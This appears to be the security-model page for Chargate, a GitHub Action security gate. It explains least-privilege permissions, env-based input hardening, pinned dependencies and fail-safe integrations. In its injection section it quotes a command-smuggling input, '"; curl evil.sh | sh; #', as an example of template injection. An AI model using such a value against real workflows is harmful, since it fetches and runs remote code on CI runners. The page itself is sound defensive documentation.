# Security model

<!-- sources: action.yml, src/chargate/megalinter.py, src/chargate/github_comment.py, broker/ -->

Chargate is a security tool, so its own posture is part of the product. This page
states what it assumes, what it grants, and what it deliberately cannot do.

## Least privilege by default

Grant the job only what the features you use need:

```yaml
permissions:
  contents: read           # checkout — the only hard requirement
  pull-requests: write     # PR comments (omit, or use `read`, with pr_comment: false)
  security-events: write   # SARIF to the Security tab (needs GHAS on private repos)
  id-token: write          # OPTIONAL — author comments as Chargate[bot]
```

`contents: read` alone is enough to run the gate. Everything else buys a feature, and
dropping it degrades that feature rather than failing the run.

The optional `Chargate[bot]` token is minted through the token broker, is short-lived,
is scoped to the calling repository, and carries `pull_requests: write` **only**. Without
`id-token: write` comments fall back to `github-actions[bot]` — no key management either
way. See [Broker deployment](broker-deployment.md).

## Injection-hardened

Every action input reaches the gate step through the **environment**, never interpolated
into a shell body. A workflow input is attacker-controllable on `pull_request_target` and
in forks, so a value like `"; curl evil.sh | sh; #` would be a shell escape in a naively
templated `run:` block. Passing through `env:` closes that class of `${{ }}` template
injection outright rather than trying to sanitise it.

## Pinned supply chain

Every third-party action Chargate calls — `checkout`, `setup-python`,
`codeql-action/upload-sarif`, `upload-artifact`, `sbom-action` — is **SHA-pinned** with a
`# vX.Y.Z` comment naming the tag that SHA belongs to.

The core CLI has **no runtime dependencies**: it is stdlib-only Python, so the gate
itself adds nothing to your dependency tree. MegaLinter runs as a pinned container image
(`megalinter_tag`, which also accepts a `sha256:` digest).

## Fail-safe integrations

DefectDojo, Dependency-Track, PR comments and the token broker are all
**failure-isolated**. An outage in any of them is logged and the run continues; none can
change the gate outcome. The gate's verdict depends only on the SARIF and the diff.

The inverse also holds, and matters more: a scan that produced **no SARIF runs** fails
the job rather than passing. Nothing scanned is not the same as nothing found.

## What a reduced scan looks like

When Chargate falls back to per-linter images (the arm64 path, see
[Setup](setup.md)) it reports the fallback in the job summary *and* on the pull request,
and names every linter it could not run, with a reason.

This is deliberate: a reduced scan that finds nothing is indistinguishable from a clean
repository unless it announces itself. The `scan_mode` output (`flavor` · `standalone` ·
`provided`) exists so a release job can refuse to ship on a degraded scan:

```yaml
- uses: magmamoose/chargate@v2
  id: gate
- name: Refuse a release built on a reduced scan
  if: steps.gate.outputs.scan_mode != 'flavor'
  run: exit 1
```

## Reporting a vulnerability

Use [GitHub private vulnerability reporting][pvr], or see [`SECURITY.md`][sec] in the
repository. Please do not open a public issue for a security report.

[pvr]: https://github.com/MagmaMoose/chargate/security/advisories/new
[sec]: https://github.com/MagmaMoose/chargate/blob/main/SECURITY.md
